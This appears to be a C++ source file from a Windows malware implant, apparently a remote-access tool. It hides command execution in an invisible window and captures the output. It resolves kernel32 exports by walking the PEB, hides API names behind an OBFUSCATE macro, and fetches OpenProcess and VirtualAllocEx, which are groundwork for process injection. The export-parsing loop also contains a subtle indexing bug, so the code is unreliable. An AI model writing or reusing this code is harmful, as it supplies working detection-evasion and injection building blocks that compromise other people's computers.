#include "utils.h"


const std::string domain_to_ip(const char* domain) {
    struct addrinfo hints, * res;
    int status;
    char ipstr[INET_ADDRSTRLEN];

    // Initialize Winsock
    WSADATA wsadata;
    if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0) {
        return "";
    }

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET; // Use IPv4
    hints.ai_socktype = SOCK_STREAM;

    if ((status = getaddrinfo(domain, NULL, &hints, &res)) != 0) {
        WSACleanup(); // Cleanup Winsock
        return "";
    }

    struct sockaddr_in* ipv4 = (struct sockaddr_in*)res->ai_addr;
    void* addr = &(ipv4->sin_addr);
    inet_ntop(res->ai_family, addr, ipstr, sizeof ipstr);
    

    freeaddrinfo(res); // Free the linked list

    WSACleanup(); // Cleanup Winsock
    return ipstr;
}



std::string exec(const char* CommandLine) {
    std::string Result = "";

    SECURITY_ATTRIBUTES securityAttributes;
    HANDLE stdOutRead, stdOutWrite;
    ZeroMemory(&securityAttributes, sizeof(SECURITY_ATTRIBUTES));
    securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
    securityAttributes.bInheritHandle = TRUE;
    securityAttributes.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&stdOutRead, &stdOutWrite, &securityAttributes, 0))
        throw GetLastError();

    try {
        STARTUPINFOA startupInfo;
        ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
        startupInfo.cb = sizeof(startupInfo);
        startupInfo.dwFlags |= STARTF_USESTDHANDLES;
        startupInfo.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
        startupInfo.hStdOutput = stdOutWrite;
        startupInfo.hStdError = stdOutWrite;
        startupInfo.dwFlags |= STARTF_USESHOWWINDOW;
        startupInfo.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi;
        ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

        if (!CreateProcessA(NULL, const_cast<char*>(CommandLine), NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &pi))
            throw GetLastError();

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        CloseHandle(stdOutWrite);
        stdOutWrite = NULL;

        char buffer[4096];
        DWORD bytesRead;

        while (ReadFile(stdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0)
            Result += std::string(buffer, buffer + bytesRead);

        DWORD le = GetLastError();
        if (le != ERROR_BROKEN_PIPE)
            throw le;
    }
    catch (...) {
        CloseHandle(stdOutRead);
        if (stdOutWrite != NULL)
            CloseHandle(stdOutWrite);

        throw;
    }

    CloseHandle(stdOutRead);
    if (stdOutWrite != NULL)
        CloseHandle(stdOutWrite);

    return Result;
}
load_library_type load_library;
get_proc_address_type get_proc_address;

void initilize_winapi() {
    PPEB peb = (PPEB)__readgsqword(0x60); // Get PEB pointer
    char* module_base = nullptr;
    // Traverse through the loaded modules to find kernel32.dll
    for (PLIST_ENTRY pEntry = peb->Ldr->InMemoryOrderModuleList.Flink;
        pEntry != &peb->Ldr->InMemoryOrderModuleList;
        pEntry = pEntry->Flink) {

        PLDR_DATA_TABLE_ENTRY pModule = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        
        // Check if the module is kernel32.dll
        if (wcscmp(pModule->BaseDllName.Buffer, OBFUSCATE(L"KERNEL32.DLL")) == 0) {
            module_base = reinterpret_cast<char*>(pModule->DllBase);
            break;
        }
    }
    if (nullptr == module_base) {
        return;
    }

    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(module_base);


    IMAGE_NT_HEADERS* ntHeader = reinterpret_cast<IMAGE_NT_HEADERS*>((uintptr_t)module_base + dosHeader->e_lfanew);

    // Get the export directory
    IMAGE_DATA_DIRECTORY exportDir = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    // Calculate the address of the export directory
    IMAGE_EXPORT_DIRECTORY* exportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>((uintptr_t)module_base + exportDir.VirtualAddress);

    // Get the function names
    uint32_t* addressOfNames = reinterpret_cast<uint32_t*>((uintptr_t)module_base + exportDirectory->AddressOfNames);

    // Get the function addresses
    uint32_t* addressOfFunctions = reinterpret_cast<uint32_t*>((uintptr_t)module_base + exportDirectory->AddressOfFunctions);

    // Get the function name ordinals
    uint16_t* addressOfNameOrdinals = reinterpret_cast<uint16_t*>((uintptr_t)module_base + exportDirectory->AddressOfNameOrdinals);

    for (size_t i = 0; i < exportDirectory->NumberOfFunctions; ++i) {
        uint32_t functionNameRVA = addressOfNames[i];
        const char* functionName = reinterpret_cast<const char*>((uintptr_t)module_base + functionNameRVA);
        uint32_t functionAddressRVA = addressOfFunctions[addressOfNameOrdinals[i]];
        uintptr_t functionAddress = (uintptr_t)module_base + functionAddressRVA;
        if (strcmp(functionName, OBFUSCATE("GetProcAddress")) == 0) {
            get_proc_address = reinterpret_cast<get_proc_address_type>(functionAddress);
        } else if (strcmp(functionName, OBFUSCATE("LoadLibraryA")) == 0) {
            load_library = reinterpret_cast<load_library_type>(functionAddress);
        }
    }

    std::string dll_store_path = std::string(OBFUSCATE("user32"));

    HMODULE kernel32 = load_library(OBFUSCATE("kernel32"));
    open_process_type open_process = reinterpret_cast<open_process_type>(get_proc_address(kernel32, OBFUSCATE("OpenProcess")));
    get_module_handle_type get_module_handle = reinterpret_cast<get_module_handle_type>(get_proc_address(kernel32, OBFUSCATE("GetModuleHandleW")));
    virtual_alloc_ex_type virtual_alloc_ex = reinterpret_cast<virtual_alloc_ex_type>(get_proc_address(kernel32, OBFUSCATE("VirtualAllocEx")));
}
